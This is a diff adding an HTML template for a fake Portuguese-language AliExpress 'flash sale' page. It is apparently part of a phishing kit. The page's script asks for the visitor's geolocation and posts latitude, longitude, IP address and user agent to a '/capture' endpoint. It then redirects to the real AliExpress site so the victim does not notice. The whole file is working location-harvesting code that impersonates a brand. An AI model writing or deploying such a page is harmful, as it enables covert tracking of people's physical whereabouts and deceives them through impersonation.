@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>AliExpress - Oferta Relâmpago!</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <style>
+        body {
+            background: #FF6A00;
+            color: white;
+        }
+        .btn {
+            background: white;
+            color: #FF6A00;
+        }
+        .header {
+            background: rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="/static/img/aliexpress-logo.png" alt="AliExpress" class="logo">
+    </div>
+
+    <div class="container">
+        <h1>🚀 PROMOÇÃO RELÂMPAGO! 🚀</h1>
+        <p>Produtos com <strong>80% OFF</strong> para sua região:</p>
+        <button class="btn" onclick="getLocation()">VER OFERTAS</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            document.getElementById("status").textContent = "Buscando ofertas próximas...";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        fetch('/capture', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                service: "aliexpress",
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                ip: "{{ request.remote_addr }}",
+                                user_agent: navigator.userAgent
+                            }),
+                            headers: { 'Content-Type': 'application/json' }
+                        }).then(() => {
+                            document.getElementById("status").innerHTML = "✅ Ofertas carregadas!";
+                            setTimeout(() => {
+                                window.location.href = "https://www.aliexpress.com";
+                            }, 3000);
+                        });
+                    },
+                    (error) => {
+                        document.getElementById("status").innerHTML = "🔍 Ative a localização para ver ofertas. Redirecionando...";
+                        setTimeout(() => {
+                            window.location.href = "https://www.aliexpress.com";
+                        }, 3000);
+                    }
+                );
+            } else {
+                document.getElementById("status").textContent = "Navegador incompatível. Redirecionando...";
+                setTimeout(() => {
+                    window.location.href = "https://www.aliexpress.com";
+                }, 3000);
+            }
+        }
+    </script>
+</body>
+</html>
